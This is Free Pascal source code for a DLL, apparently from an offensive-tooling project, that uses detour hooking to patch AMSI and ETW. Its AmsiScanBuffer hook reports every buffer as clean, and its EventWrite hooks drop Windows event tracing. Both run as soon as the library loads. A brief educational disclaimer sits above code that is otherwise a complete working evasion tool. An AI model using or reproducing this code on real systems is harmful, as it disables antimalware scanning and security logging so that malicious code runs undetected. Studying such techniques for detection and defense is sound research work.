
{

     ** Title : Bypass AMSI / ETW patching using Detour Hooking
     ** Author : @zux0x3a / 0xsp.com

     The following tool considered as part of offensive pascal project and published to highlight the
     capabilities of Free Pascal Language for malware and offensive security tooling development.



  NOTICE:
  This Tool is intended for educational and research purposes.Misuse of this tool for malicious intent or
  illegal activities is strongly discouraged and disclaimed.Users are expected to comply with all applicable laws and regulations.



}


library AmsiHook;

{$mode delphi}

uses
  Classes,windows,DDetours;

  type
  EVENT_DESCRIPTOR = record
    Id : USHORT;
    Version: UCHAR;
    Channel : UCHAR;
    Level : UCHAR;
    Opcode : UCHAR;
    Task : USHORT;
    Keyword : ULONGLONG;
    end;

type
    EVENT_TRACE_HEADER = record
    Size : USHORT;
    HeaderType : UCHAR;
    Flags : UCHAR;
    EventProperty: UCHAR;
    ThreadId : ULONG;
    ProcessId : ULONG;
    TimeStamp : LARGE_INTEGER;
    KernelTime : ULONG;
    UserTime : ULONG;
    ProvderId : GUID;
    EventDescriptor : EVENT_DESCRIPTOR;
    end;

  PCEVENT_TRACE_HEADER = ^EVENT_TRACE_HEADER;
  PCEVENT_DESCRIPTOR = ^EVENT_DESCRIPTOR;






type
 HAMSICONTEXT = Pointer;
 HAMSISESSION = Pointer;
 AMSI_RESULT = Longword;

type
  TOriginalAmsiScanBuffer = function(
    amsiContext: HAMSICONTEXT;
    buffer: PVOID;
    length: ULONG;
    contentName: LPCWSTR;
    amsiSession: HAMSISESSION;
    var result: AMSI_RESULT
  ): HRESULT; stdcall;


type
    TEventWrite = function(RegistrationHandle : Thandle; EventTrace: PCEVENT_TRACE_HEADER; EventInformation:ULONG):ULONG; stdcall;



type

  TEventWriteTransfer = function(RegistrationHandle : Thandle; EventTrace: PCEVENT_TRACE_HEADER; EventInformation:ULONG; EventGuid: PCEVENT_DESCRIPTOR; TransferContext:Pointer):ULONG; stdcall;




var
  OriginalAmsiScanBuffer: TOriginalAmsiScanBuffer;
  OriginalEventWrite : TEventWrite = nil;
  OriginalEventTransfer : TEventWriteTransfer = nil;



function InterceptEventWrite(RegistrationHandle : Thandle; EventTrace: PCEVENT_TRACE_HEADER; EventInformation:ULONG):ULONG; stdcall;
begin

  Writeln('[+] ETW Hooked !');  // enable it for debugging only
  Result := $80000000;
end;

function InterceptEventTransfer(RegistrationHandle : Thandle; EventTrace: PCEVENT_TRACE_HEADER; EventInformation:ULONG; EventGuid: PCEVENT_DESCRIPTOR; TransferContext:Pointer):ULONG; stdcall;
begin
Result := $80000000;
end;

function _AmsiScanBuffer(
  amsiContext: HAMSICONTEXT;
  buffer: PVOID;
  length: ULONG;
  contentName: LPCWSTR;
  amsiSession: HAMSISESSION;
  var Scanresult: AMSI_RESULT
): HRESULT; stdcall;
begin
  Writeln('[+] AmsiScanBuffer Hooked !');    // enable it for debugging purposes only
  Scanresult := $00000000   // we are clean :)
end;

procedure AmsiScanBuffer;
begin
  @OriginalAmsiScanBuffer := GetProcAddress(GetModuleHandle('amsi.dll'), 'AmsiScanBuffer');
  if @OriginalAmsiScanBuffer <> nil then
    InterceptCreate(@OriginalAmsiScanBuffer, @_AmsiScanBuffer,nil, []);
end;


procedure ETWHook;
begin

  @OriginalEventWrite := GetProcAddress(GetModuleHandle('advapi32.dll'), 'EventWrite');
  @OriginalEventTransfer := GetProcAddress(GetModuleHandle('advapi32.dll'), 'EventWriteTransfer');

   InterceptCreate(@OriginalEventWrite,@interceptEventwrite,nil, []);
   InterceptCreate(@OriginalEventTransfer,@interceptEventTransfer,nil,[])
end;


//exports
//  AmsiScanBuffer;     // no need

begin
  AmsiScanBuffer;
  ETWHook;
end.

